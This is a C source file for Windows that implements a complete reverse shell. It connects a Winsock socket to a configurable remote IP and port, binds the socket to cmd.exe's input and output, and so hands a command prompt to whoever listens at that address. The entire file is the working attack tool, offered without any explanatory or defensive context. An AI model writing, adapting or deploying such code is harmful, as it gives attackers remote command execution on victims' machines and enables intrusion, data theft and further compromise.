#include<stdio.h>
#include<winsock2.h>
#include<windows.h>
#include<ws2tcpip.h>
#pragma comment(lib,"Ws2_32.lib")
int main()
{
		SOCKET shell;
		sockaddr_in shell_addr;
		WSADATA wsa;
		STARTUPINFO si;
		PROCESS_INFORMATION pi;
		char RecvServer[512];
		int connection;
		
		
		char ip_addr[] = "1.1.1.1"; //enter ip of the target windows machine here 
		int port = 8081; //specify the port here
		WSAStartup(MAKEWORD(2,2),&wsa);
		shell=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int) NULL);
		
		shell_addr.sin_port = htons(port);
		shell_addr.sin_family = AF_INET;
		shell_addr.sin_addr.s_addr = inet_addr(ip_addr);
		
		connection = WSAConnect(shell,(SOCKADDR*)&shell_addr,sizeof(shell_addr),NULL,NULL,NULL,NULL);
		
		if(connection == SOCKET_ERROR)
		{
			printf("[!] connection to the target failed,Please try again later....\n");
		exit(0);
		}
		else{
			recv(shell,RecvServer,sizeof(RecvServer),0);
			memset(&si,0,sizeof(si));
			si.cb=sizeof(si);
			si.dwFlags=(STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
			si.hStdInput=si.hStdOutput = si.hStdError = (HANDLE) shell;
			
			SetHandleInformation((HANDLE)shell, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);

			CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

		//	CreateProcess(NULL,"C:\\Windows\\System32\\cmd.exe",NULL,NULL,TRUE,0,NULL,NULL,&si,&pi);
			WaitForSingleObject(pi.hProcess,INFINITE);
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
			memset(RecvServer,0,sizeof(RecvServer));
		}
		
}
